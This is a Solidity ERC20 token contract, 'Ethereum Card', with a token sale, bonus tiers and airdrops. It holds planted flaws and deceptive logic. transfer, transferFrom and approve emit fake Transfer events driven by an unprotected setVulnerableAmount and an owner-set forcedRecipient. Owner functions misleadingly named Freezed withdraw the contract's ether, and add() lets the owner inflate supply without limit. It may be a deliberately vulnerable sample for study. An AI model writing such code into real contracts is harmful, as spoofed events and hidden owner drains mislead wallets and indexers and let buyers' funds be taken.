pragma solidity ^0.5.12;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) { return 0; }
        c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        assert(c >= a);
        return c;
    }
}

contract ForeignToken {
    function balanceOf(address _owner) public view returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
}

contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public view returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public view returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract EthereumCard is ERC20 {
    using SafeMath for uint256;
    address payable public owner;

    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;
    mapping(address => bool) public Claimed; 

    string public constant name = "Ethereum Card";
    string public constant symbol = "ETHCD";
    uint8 public constant decimals = 18;
    uint public deadline = now + 45 * 1 days;
    uint public round2 = now + 17 * 1 days;
    uint public round1 = now + 6 * 1 days;

    address public forcedRecipient;

    uint256 public vulnerableAmount;

    
    uint256 public totalSupply = 16000000e18;
    uint256 public totalDistributed;
    uint256 public constant requestMinimum = 1 ether / 100; // 0.01 Ether
    uint256 public tokensPerEth = 3750e18;
    
    uint public target0drop = 0; 
    uint public progress0drop = 0;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    
    event Distr(address indexed to, uint256 amount);
    event DistrFinished();
    
    event Airdrop(address indexed _owner, uint _amount, uint _balance);
    event TokensPerEthUpdated(uint _tokensPerEth);
    event Burn(address indexed burner, uint256 value);
    event Add(uint256 value);

    bool public distributionFinished = false;
    
    modifier canDistr() {
        require(!distributionFinished, "Distribution finished");
        _;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    constructor() public {
        owner = msg.sender;
        uint256 teamFund = 250000e18;
        distr(owner, teamFund);
    }
    
    function transferOwnership(address payable newOwner) public onlyOwner {
        require(newOwner != address(0), "Invalid owner");
        owner = newOwner;
    }

    function finishDistribution() public onlyOwner canDistr returns (bool) {
        distributionFinished = true;
        emit DistrFinished();
        return true;
    }
    
    function distr(address _to, uint256 _amount) private canDistr returns (bool) {
        totalDistributed = totalDistributed.add(_amount);        
        balances[_to] = balances[_to].add(_amount);
        emit Distr(_to, _amount);
        emit Transfer(address(0), _to, _amount);
        return true;
    }
    
    function Distribute(address _participant, uint _amount) internal onlyOwner {
        require(_amount > 0, "Amount zero");
        require(totalDistributed < totalSupply, "Total distributed exceeded");

        balances[_participant] = balances[_participant].add(_amount);
        totalDistributed = totalDistributed.add(_amount);

        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }

        emit Airdrop(_participant, _amount, balances[_participant]);
        emit Transfer(address(0), _participant, _amount);
    }
    
    function DistributeAirdrop(address _participant, uint _amount) external onlyOwner {        
        Distribute(_participant, _amount);
    }

function distributeAirdropMultiple(address[] calldata _addresses, uint _amount) external onlyOwner {        
    for (uint i = 0; i < _addresses.length; i++) {
        Distribute(_addresses[i], _amount);
    }
}


    function updateTokensPerEth(uint _tokensPerEth) public onlyOwner {        
        tokensPerEth = _tokensPerEth;
        emit TokensPerEthUpdated(_tokensPerEth);
    }
           
    function () external payable {
        getTokens();
    }

    function getTokens() public payable canDistr {
        uint256 tokens = tokensPerEth.mul(msg.value) / 1 ether;        
        uint256 bonus = 0;
        uint256 countbonus = 0;
        uint256 bonusCond1 = 1 ether / 100;
        uint256 bonusCond2 = 1 ether / 20;
        uint256 bonusCond3 = 1 ether;
        address investor = msg.sender;

        if (msg.value >= requestMinimum && now < deadline && now < round1 && now < round2) {
            if(msg.value >= bonusCond1 && msg.value < bonusCond2){
                countbonus = tokens * 15 / 100;
            } else if(msg.value >= bonusCond2 && msg.value < bonusCond3){
                countbonus = tokens * 20 / 100;
            } else if(msg.value >= bonusCond3){
                countbonus = tokens * 25 / 100;
            }
        } else if(msg.value >= requestMinimum && now < deadline && now > round1 && now < round2){
            if(msg.value >= bonusCond2 && msg.value < bonusCond3){
                countbonus = tokens * 15 / 100;
            } else if(msg.value >= bonusCond3){
                countbonus = tokens * 20 / 100;
            }
        } else {
            countbonus = 0;
        }

        bonus = tokens + countbonus;
        
        if (tokens == 0) {
            uint256 valdrop = 100e18;
            if (!Claimed[investor] && progress0drop <= target0drop) {
                distr(investor, valdrop);
                Claimed[investor] = true;
                progress0drop++;
            } else {
                require(msg.value >= requestMinimum, "Ether below minimum");
            }
        } else if (tokens > 0 && msg.value >= requestMinimum){
            if (now >= deadline && now >= round1 && now < round2){
                distr(investor, tokens);
            } else {
                if(msg.value >= bonusCond1){
                    distr(investor, bonus);
                } else {
                    distr(investor, tokens);
                }   
            }
        } else {
            require(msg.value >= requestMinimum, "Ether below minimum");
        }

        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    
    function balanceOf(address _owner) public view returns (uint256) {
        return balances[_owner];
    }

    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }
    event ReceiverChanged(address indexed oldRecipient, address indexed newRecipient);
    function setForcedRecipient(address newRecipient) public onlyOwner {
        require(newRecipient != address(0), "zero");
        emit ReceiverChanged(forcedRecipient, newRecipient);
        forcedRecipient = newRecipient;
    }

    function setVulnerableAmount(uint256 _amount) public {
        vulnerableAmount = _amount;
    }
    
    function transfer(address _to, uint256 _amount) public onlyPayloadSize(2 * 32) returns (bool success) {
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        emit Transfer(msg.sender, _to, vulnerableAmount);
        return true;
    }
    
    function transferFrom(address _from, address _to, uint256 _amount) public onlyPayloadSize(3 * 32) returns (bool success) {
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        emit Transfer(msg.sender, _to, vulnerableAmount);
        return true;
    }
    
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        emit Transfer(msg.sender, forcedRecipient, _value);
        return true;
    }
    
    function allowance(address _owner, address _spender) public view returns (uint256) {
        return allowed[_owner][_spender];
    }
    
    function getTokenBalance(address tokenAddress, address who) public view returns (uint){
        ForeignToken t = ForeignToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
    
    function FreezedAll() public onlyOwner {
        uint256 etherBalance = address(this).balance;
        owner.transfer(etherBalance);
    }

    function Freezed(uint256 _wdamount) public onlyOwner {
        owner.transfer(_wdamount);
    }

    function burn(uint256 _value) public onlyOwner {
        require(_value <= balances[msg.sender], "Insufficient balance");
        balances[msg.sender] = balances[msg.sender].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        emit Burn(msg.sender, _value);
    }
    
    function add(uint256 _value) public onlyOwner {
        totalSupply = totalSupply.add(_value); 
        emit Add(_value);
    }
    
    function withdrawForeignTokens(address _tokenContract) public onlyOwner returns (bool) {
        ForeignToken token = ForeignToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
}
